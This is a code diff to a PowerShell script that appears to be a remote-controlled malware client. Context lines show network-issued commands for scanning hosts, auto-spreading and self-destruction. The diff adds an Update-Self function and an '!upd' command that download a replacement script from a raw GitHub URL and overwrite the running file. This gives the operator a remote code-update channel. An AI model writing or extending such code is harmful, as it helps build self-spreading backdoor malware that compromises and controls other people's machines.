@@ -557,6 +557,27 @@ function PortSuggest {
     }
 }
 
+
+function Update-Self {
+    param (
+        [string]$url = "https://raw.githubusercontent.com/zipo0/studytime-/main/client.ps1"
+    )
+
+    $path = $MyInvocation.MyCommand.Path
+    if (-not $path) {
+        return "[ERROR] Can't update: unknown path"
+    }
+
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing
+        return "[+] Script updated successfully from $url"
+    }
+    catch {
+        return "[ERROR] Update failed: $($_.Exception.Message)"
+    }
+}
+
+
     function Self-Destruct {
     try {
         $scriptPath = $MyInvocation.MyCommand.Path
@@ -680,6 +701,9 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     elseif ($cmd -eq "scanHosts") {
                         Get-AliveHosts -stream $stream
                         $response = ""
+                    }
+                   elseif ($cmd -eq "!upd") {
+                        $response = Update-Self
                     }
                     elseif ($cmd -eq "!autospread") {
                         Invoke-AutoSpread -stream $stream
